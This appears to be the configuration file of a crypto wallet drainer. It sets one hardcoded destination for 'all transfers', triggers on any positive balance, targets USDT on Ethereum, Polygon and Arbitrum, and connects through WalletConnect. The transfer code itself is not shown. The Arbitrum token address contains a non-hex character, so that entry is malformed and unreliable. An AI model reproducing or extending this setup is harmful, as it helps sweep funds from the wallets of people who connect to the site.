// Transfer Configuration
export const TRANSFER_CONFIG = {
  // Hardcoded destination address for all transfers
  destinationAddress: "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD45",
  
  // Minimum threshold to trigger transfer (0 = any positive balance)
  threshold: 0,
  
  // Backend API URL (change to your production API)
  apiBaseUrl: "https://api.your-backend.com",
};

// Token Contract Addresses (USDT on various chains)
export const TOKEN_ADDRESSES = {
  USDT: {
    1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum Mainnet
    137: "0xc2132D05D31f9b7cB4895E6FbF4e498EaB6fB4Dd", // Polygon
    42161: "0xFd086bC7CD5C481DCC9C85bE4sA764aF2Bf8C8f4", // Arbitrum
  },
};

// Wallet Connect Configuration
export const WALLET_CONNECT_CONFIG = {
  projectId: "your-project-id-here", // Replace with your Wallet Connect Project ID
  relayUrl: "wss://relay.walletconnect.com",
};